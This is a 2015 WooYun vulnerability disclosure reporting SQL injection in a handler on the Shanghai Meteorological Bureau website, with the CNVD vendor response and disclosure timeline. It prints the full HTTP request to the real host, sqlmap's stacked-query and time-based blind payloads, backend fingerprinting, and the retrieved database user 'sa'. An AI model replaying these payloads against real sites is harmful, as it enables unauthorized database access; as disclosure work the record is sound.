wybug_status: 已交由第三方合作机构(cncert国家互联网应急中心)处理
wybug_detail:
漏洞详情 披露状态：   									2015-02-28：	细节已通知厂商并且等待厂商处理中									2015-03-04：	厂商已经确认，细节仅向厂商公开									2015-03-14：	细节向核心白帽子及相关领域专家公开									2015-03-24：	细节向普通白帽子公开									2015-04-03：	细节向实习白帽子公开									2015-04-14：	细节向公众公开  简要描述：  详细说明：  上海市气象局 smb.gov.cnInfoGuid 和CategoryID 都存在注入
GET /Handler/InformationViewCount.ashx?action=update&InfoGuid=00533280-0761-4c28-bdb1-205f5381a2c2&CategoryID=8de94fa7-77a5-42de-a406-d1b51127c4ce HTTP/1.1User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.5 (KHTML, like Gecko) Chrome/4.0.249.78 Safari/532.5Accept: */*Accept-Language: en-us,en;q=0.8,en-us,en;q=0.5Referer: http://smb.gov.cn/html/qxxw/qxyw/infodetail-00533280-0761-4c28-bdb1-205f5381a2c2.htmlCache-Control: no-cacheX-Forwarded-For: 127.0.0.1X-Remote-IP: 127.0.0.1Host: smb.gov.cnAccept-Encoding: gzip, deflate
sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: CategoryID    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: action=update&InfoGuid=00533280-0761-4c28-bdb1-205f5381a2c2&CategoryID=8de94fa7-77a5-42de-a406-d1b51127c4ce'; WAITFOR DELAY '0:0:5'--    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: action=update&InfoGuid=00533280-0761-4c28-bdb1-205f5381a2c2&CategoryID=8de94fa7-77a5-42de-a406-d1b51127c4ce' WAITFOR DELAY '0:0:5'-----[13:17:17] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windows Vistaweb application technology: ASP.NET, ASP.NET 2.0.50727, Microsoft IIS 7.0back-end DBMS: Microsoft SQL Server 2008[13:17:17] [INFO] fetching database users[13:17:17] [INFO] fetching number of database users[13:17:17] [WARNING] time-based comparison needs larger statistical model. Making a few dummy requests, please wait..[13:17:17] [WARNING] it is very important not to stress the network adapter's bandwidth during usage of time-based payloadsdo you want sqlmap to try to optimize value(s) for DBMS delay responses (option'--time-sec')? [Y/n] Y[13:17:35] [INFO] adjusting time delay to 1 second due to good response times3[13:17:35] [INFO] retrieved: sa   漏洞证明：     修复方案：     版权声明：转载请注明来源 路人甲@乌云
wybug_reply: 漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2015-03-04 14:56 厂商回复： CNVD确认所述情况，已经转由CNCERT下发给分中心，由其后续协调网站管理单位处置。 最新状态： 暂无
